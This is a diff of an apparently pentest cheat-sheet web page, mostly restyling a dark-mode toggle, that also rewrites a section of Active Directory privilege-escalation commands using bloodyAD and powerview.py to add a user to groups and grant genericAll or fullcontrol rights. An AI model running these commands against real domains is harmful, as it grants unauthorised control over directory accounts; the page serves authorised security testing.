@@ -44,16 +44,20 @@
 </div>
     
 <style>
+ 
 
  
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
 
 .js-toggle-wrapper {
     display: table;
-
-     
     float: right;
     margin-left: auto;
-    margin-right: 0;
 }
 
 .js-toggle {
@@ -62,76 +66,60 @@
     position: relative;
     cursor: pointer;
     background-color: transparent;
-    border: 0;
-    padding: 0;
-    -webkit-touch-callout: none;
     user-select: none;
-    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-    -webkit-tap-highlight-color: transparent;
-  }
-  
-  .js-toggle-screenreader-only {
-    border: 0;
-    clip: rect(0 0 0 0);
-    height: 1px;
-    margin: -1px;
-    overflow: hidden;
-    padding: 0;
+}
+
+.js-toggle-screenreader-only {
     position: absolute;
     width: 1px;
-  }
-  
-  .js-toggle-track {
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
     width: 50px;
     height: 24px;
-    padding: 0;
     border-radius: 30px;
     background-color: hsl(223, 61%, 44%);
-    transition: all 0.2s ease;
-  }
-  
-  .js-toggle-track-check {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    left: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 0;
-    transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-    transition: opacity 0.25s ease;
-  }
+    transition: background-color 0.2s ease;
+}
 
-  .js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-  }
-  
-  .js-toggle-track-x {
+.js-toggle-track-check,
+.js-toggle-track-x {
     position: absolute;
     width: 17px;
     height: 17px;
-    right: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 1;
+    top: 50%;
+    transform: translateY(-50%);
     transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-x {
+}
+
+.js-toggle-track-check {
+    left: 5px;
     opacity: 0;
-  }
-  
-  .js-toggle-thumb {
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
     position: absolute;
     top: 1px;
     left: 1px;
@@ -139,15 +127,12 @@
     height: 22px;
     border-radius: 50%;
     background-color: #fafafa;
-    box-sizing: border-box;
-    transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0ms;
-    transform: translateX(0);
-  }
-  
-  .js-toggle--checked .js-toggle-thumb {
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
     transform: translateX(26px);
-    border-color: #19ab27;
-  }
+}
 </style>
 
 <script>
@@ -176,7 +161,6 @@
         switcher.classList.add('js-toggle--checked');
         body.classList.add('dark-mode');
     }
-
 </script>
   <p class="desc"></p>
 </header>
@@ -203,7 +187,7 @@
 </ul>
 <hr>
 <div class="content">
-<div id="dynamicFormContainer">
+  <div id="dynamicFormContainer">
 	<form id="dynamicForm" style="display: none;">
 	</form>
 	<div class="buttons center">
@@ -343,39 +327,38 @@ body.dark-mode #dynamicFormContainer button:hover {
     cursor: pointer;
     background: #424242;
 }
-
-
 </style>
-<h3 id="privesc-1-add-self-to-group-from-linux">Privesc #1: Add self to group (From Linux)</h3>
+  <h3 id="privesc-1-add-self-to-group-from-linux">Privesc #1: Add self to group (From Linux)</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">powerview.py</button>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">bloodyAD</button>
 
-<button data-tabset="set1" data-tabcontent="tab2" >bloodyAD</button>
+<button data-tabset="set1" data-tabcontent="tab2" >powerview.py</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; powerview &#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add self to group
-</span></span><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &lt;TARGET_GROUP&gt; -Members &lt;USERNAME&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &lt;TARGET_GROUP&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login again to apply changes
-</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &lt;ANOTHER_GROUP&gt; -PrincipalIdentity &lt;USERNAME&gt; -Rights fullcontrol
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity &lt;TARGET_USER_IN_ANOTHER_GROUP&gt; -Where &#39;SecurityIdentifier contains &lt;USERNAME&gt;&#39;
-</span></span></span></code></pre></div></div>
-<p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div>
-
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add self to group
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &lt;TARGET_GROUP&gt; &lt;USERNAME&gt;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-add-self-to-group">1. Add self to group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &lt;GROUP&gt; &#39;&lt;USER&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -k --host &lt;DC&gt; add groupMember &lt;TARGET_GROUP&gt; &lt;USERNAME&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> After getting full control of target group <span class="o">(</span>e.g. TARGET_GROUP has genericall over ANOTHER_GROUP<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add genericAll &#39;OU=&lt;ANOTHER_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &lt;USERNAME&gt;
-</span></span></span></code></pre></div></div>
-<p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div></p>
-<br>
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -k --host &lt;DC&gt; add groupMember &lt;GROUP&gt; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><h4 id="2-add-genericall-over-target-group">2. Add genericAll over target group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -k --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-connect">1. Connect</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; powerview &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39;
+</span></span></span></code></pre></div><h4 id="2-add-self-to-group">2. Add self to group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &lt;GROUP&gt; -Members &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &lt;GROUP&gt;
+</span></span></span></code></pre></div><h4 id="4-add-fullcontrol-over-target-group">4. Add fullcontrol over target group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login again to apply changes
+</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &lt;TARGET_GROUP&gt; -PrincipalIdentity &#39;&lt;USER&gt;&#39; -Rights fullcontrol
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity &lt;TARGET_USER&gt; -Where &#39;SecurityIdentifier contains &lt;USER&gt;&#39;
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div></p>
+
 </div></div>
     
     <script src="/js/utils.js"></script>
@@ -383,8 +366,6 @@ body.dark-mode #dynamicFormContainer button:hover {
     <hr>
     <div class="footer-text">
         <div>© 2024 TLDRBins</div>
-        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
-                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
     </div>
 </footer>
 </body>
